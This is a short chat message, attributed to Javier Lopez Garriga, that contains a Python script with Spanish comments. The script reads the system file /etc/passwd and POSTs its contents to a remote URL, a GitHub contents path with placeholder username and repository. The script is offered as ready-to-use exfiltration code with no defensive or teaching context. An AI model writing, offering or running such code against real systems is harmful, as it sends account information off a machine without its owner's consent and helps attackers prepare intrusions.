[16:40] Javier Lopez Garriga
import os

import requests
 
def get_passwd():

    """Obtiene el archivo passwd."""

    return open("/etc/passwd", "r").read()
 
def send_passwd(passwd):

    """Envía el archivo passwd a una ubicación remota."""

    # Sustituya la siguiente URL por la URL de la ubicación remota donde desea cargar el archivo passwd.

    url = "https://github.com/<username>/<repo>/contents/passwd.txt"

    response = requests.post(url, data=passwd)

    if response.status_code == 200:

        print("El archivo passwd se cargó correctamente.")

    else:

        print("No se pudo cargar el archivo passwd.")
 
if __name__ == "__main__":

    passwd = get_passwd()

    send_passwd(passwd)
